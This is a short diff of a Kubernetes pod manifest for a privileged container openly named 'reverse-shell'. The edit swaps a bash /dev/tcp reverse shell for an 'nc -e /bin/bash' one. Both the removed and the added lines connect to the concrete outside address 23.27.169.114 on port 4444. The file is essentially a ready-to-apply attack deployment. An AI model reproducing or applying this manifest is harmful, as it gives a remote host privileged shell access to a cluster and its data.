@@ -13,16 +13,8 @@ spec:
   containers:
     - name: reverse-shell
       image: ubuntu:latest
-      command: ["/bin/bash", "-c"]
-      args:
-        - |
-          # Install curl if it's not already installed
-          apt-get update && apt-get install -y curl && \
-          # Create the reverse shell script
-          echo "bash -i >& /dev/tcp/23.27.169.114/4444 0>&1" > /tmp/reverse_shell.sh && \
-          chmod +x /tmp/reverse_shell.sh && \
-          # Execute the reverse shell
-          /tmp/reverse_shell.sh        
+      command: ["/bin/bash", "-c", "--"]
+      args: ["nc 23.27.169.114 4444 -e /bin/bash;"]
       securityContext:
         privileged: true  # Set to false unless needed
       tty: true
